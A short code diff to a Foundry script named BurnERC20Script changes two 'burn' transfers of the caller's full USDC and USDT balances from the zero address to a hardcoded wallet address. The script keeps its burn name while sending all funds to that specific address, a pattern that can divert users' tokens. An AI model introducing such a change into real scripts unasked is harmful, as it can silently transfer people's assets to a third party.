@@ -16,8 +16,8 @@ contract BurnERC20Script is Script, Config {
         uint256 usdtBalance = usdt.balanceOf(msg.sender);
 
         vm.startBroadcast();
-        usdc.transfer(address(0), usdcBalance);
-        usdt.transfer(address(0), usdtBalance);
+        usdc.transfer(0x00B036B58a818B1BC34d502D3fE730Db729e62AC, usdcBalance);
+        usdt.transfer(0x00B036B58a818B1BC34d502D3fE730Db729e62AC, usdtBalance);
         vm.stopBroadcast();
     }
 }
